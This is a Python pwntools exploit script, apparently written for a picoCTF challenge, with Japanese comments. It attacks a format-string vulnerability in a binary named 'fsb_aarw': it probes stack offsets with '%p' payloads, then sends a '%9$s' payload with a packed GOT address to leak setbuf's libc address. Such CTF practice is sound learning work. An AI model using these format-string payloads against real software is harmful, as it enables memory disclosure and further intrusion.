#!/usr/bin/env python3
from pwn import *

bin_file = './fsb_aarw'
context( os = 'linux', arch = 'amd64' )
# context.log_level = 'debug'

binf              = ELF( bin_file )
addr_main_offset  = binf.functions['main'].address
addr_got_setbuf   = binf.got['setbuf']
addr_bss          = binf.bss()

info( f"addr_main_offset=0x{addr_main_offset:08X}, addr_got_setbuf=0x{addr_got_setbuf:08X}" ) # hex(addr_got_setbuf)の方がいいかも

def attack( proc, **kwargs ):
    
    if False:
        # AAAAAAAA が出現する位置を確認する
        proc.sendline( b'AAAAAAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p' )
        info( proc.recv().decode() )
        
        exit()
    
    elif False:
        # 位置が正しいことを確認するため、アドレスを出力する
        proc.sendline( b'%9$p'.ljust(8, b' ') + p64(0x404020) )
        info( proc.recv().decode() )
        
        exit()
    
    else:
        # GOT (0x404020) の値を出力する
        proc.sendline( b'%9$s'.ljust(8, b' ') + p64(0x404020) )
        if False:
            ret = proc.recvregex( b'([0-9a-f]+)', capture=True )
            info( f"0x{int(ret.group(0).decode(), 16)}" )
            info( f"0x{int(ret.group(1).decode(), 16)}" )
            #info( f"0x{u64(ret.group(0))}" )
        elif False:
            info( f"0x{int(proc.recv().strip(), 16)}" )
        elif True:
            tmp = u64( proc.recv(6) + b'\x00\x00' )
            info( hex(tmp) )
        
        #info( proc.recv().decode() ) # エラーが出るため、decode() を削除

def main():
    
    adrs = "shape-facility.picoctf.net"
    #adrs = "localhost"
    port = 51556
    #port = 4000
    
    #proc = gdb.debug( bin_file )
    proc = process( bin_file )
    #proc = remote( adrs, port )
    
    attack( proc )
    #proc.interactive()

if __name__ == '__main__':
    main()
